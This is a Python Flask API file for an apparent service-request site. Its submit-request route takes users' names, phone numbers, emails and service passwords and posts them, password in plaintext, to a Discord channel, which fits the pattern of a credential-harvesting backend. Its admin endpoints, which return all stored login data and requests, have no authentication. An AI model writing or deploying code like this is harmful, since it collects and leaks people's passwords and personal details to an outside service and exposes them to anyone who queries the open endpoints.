from flask import Blueprint, request, jsonify
from models import verify_login, save_request, get_user_requests, get_all_login_data, get_all_requests
from utils import send_to_discord

api = Blueprint('api', __name__)

@api.route('/login', methods=['POST'])
def login():
    data = request.json
    user = verify_login(data.get('username'), data.get('password'))
    if user:
        return jsonify({"success": True, "user_id": user['id'], "username": user['username'], "role": user['role']})
    return jsonify({"success": False, "message": "Invalid Credentials"}), 401

@api.route('/submit-request', methods=['POST'])
def submit_request():
    data = request.json
    save_request(data['user_id'], data['name'], data['mobile'], data['email'], data['service_password'])
    
    msg = f"📥 *New Request*\n👤 {data['name']}\n📱 {data['mobile']}\n📧 {data['email']}\n🔑 `{data['service_password']}`"
    send_to_discord(msg)
    
    return jsonify({"success": True})

@api.route('/user-requests/<int:user_id>', methods=['GET'])
def user_requests(user_id):
    return jsonify(get_user_requests(user_id))

@api.route('/admin/login-data', methods=['GET'])
def admin_login_data():
    return jsonify(get_all_login_data())

@api.route('/admin/requests', methods=['GET'])
def admin_requests():
    return jsonify(get_all_requests())